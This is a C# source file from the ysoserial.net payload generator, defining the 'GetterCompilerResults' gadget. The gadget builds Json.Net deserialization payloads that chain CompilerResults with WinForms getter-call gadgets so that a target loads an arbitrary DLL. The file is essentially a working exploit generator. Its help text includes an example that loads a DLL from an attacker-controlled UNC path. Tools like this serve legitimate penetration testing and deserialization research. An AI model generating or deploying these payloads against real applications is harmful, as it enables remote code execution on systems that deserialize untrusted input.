using NDesk.Options;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Runtime.Serialization;
using System.Security.Principal;
using System.Windows.Markup;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    public class GetterCompilerResultsGenerator : GenericGenerator
    {
        // CompilerResults + Getter call gadget
        // CompilerResults.get_CompiledAssembly leads to the DLL Load: remote DLL loading for .NET 5/6/7 and local DLL loading for .NET Framework
        // .NET 5/6/7 requires WPF enabled, as getter-call gadgets exist in WPF assemblies
        // Mixed DLLs can be loaded

        // We can deserialize the CompilerResults with proper member values
        // and then call the get_CompiledAssembly with one of the getter-call gadgets:
        // PropertyGrid
        // ComboBox
        // ListBox
        // CheckedListBox

        // It should be possible to use it with the serializers that are able to call the one-arg constructor

        private int variant_number = 1; // Default

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "Json.Net"}; // MessagePack should work too
        }

        public override string Name()
        {
            return "GetterCompilerResults";
        }

        public override string Finders()
        {
            return "Piotr Bazydlo";
        }

        public override string AdditionalInfo()
        {
            return "Remote DLL loading gadget for .NET 5/6/7 with WPF enabled (mixed DLL). Local DLL loading for .NET Framework if System.CodeDom is available. DLL path delivered with -c argument";
        }

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                {"var|variant=", "Variant number. Variant defines a different getter-call gadget. Choices: \r\n1 (default) - PropertyGrid getter-call gadget, " +
                "\r\n2 - ComboBox getter-call gadget (may load DLL twice)" +
                "\r\n3 - ListBox getter-call gadget" +
                "\r\n4 - CheckedListBox getter-call gadget", v => int.TryParse(v, out variant_number) },
            };

            return options;
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.GetterChainNotDerived, "Remote DLL loading for .NET 5/6/7 with WPF Enabled, Local DLL loading for .NET Framework if System.CodeDom is available" };
        }

        public override string SupportedBridgedFormatter()
        {
            return Formatters.BinaryFormatter;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            String payload;
            String compilerPayload;
            inputArgs.IsRawCmd = true;

            if (!inputArgs.CmdFullString.ToLowerInvariant().EndsWith(".dll"))
            {
                Console.WriteLine("This gadget loads remote (.NET 5/6/7) or local file (.NET Framework, if System.CodeDom is available): -c argument should provide a file path to your mixed DLL file, which needs to end with the \".dll\"\r\nUNC paths can be used for the remote DLL loading, like \\\\attacker\\poc\\your.dll\r\nIf you want to deliver file with a different extension than .dll, please modify the gadget manually\r\nExample: ysoserial.exe -g GetterCompilerResults -f Json.Net -c '\\\\attacker\\poc\\your.dll'");
                Environment.Exit(-1);
            }

            if (formatter.ToLower().Equals("json.net"))
            {
                inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;

                compilerPayload = @"{
            '$type':'System.CodeDom.Compiler.CompilerResults, System.CodeDom, Version=5.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51',
            'tempFiles':null,
            'PathToAssembly':'" + inputArgs.CmdFullString + @"'
        }";

                if (variant_number == 2)
                {
                    payload = @"{
    '$type':'System.Windows.Forms.ComboBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'Items':[
        " + compilerPayload + @"
    ], 
    'DisplayMember':'CompiledAssembly',
    'Text':'whatever'
}";
                }
                else if (variant_number == 3)
                {
                    payload = @"{
    '$type':'System.Windows.Forms.ListBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'Items':[
        " + compilerPayload + @"
    ], 
    'DisplayMember':'CompiledAssembly',
    'Text':'whatever'
}";
                }
                else if (variant_number == 4)
                {
                    payload = @"{
    '$type':'System.Windows.Forms.CheckedListBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'Items':[
        " + compilerPayload + @"
    ], 
    'DisplayMember':'CompiledAssembly',
    'Text':'whatever'
}";
                }
                else
                {
                    payload = @"{
    '$type':'System.Windows.Forms.PropertyGrid, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'SelectedObjects':[
        " + compilerPayload + @"
    ]
}";
                }

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = JsonHelper.Minify(payload, new string[] { "mscorlib" }, null);
                    }
                    else
                    {
                        payload = JsonHelper.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.JsonNet_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }

}
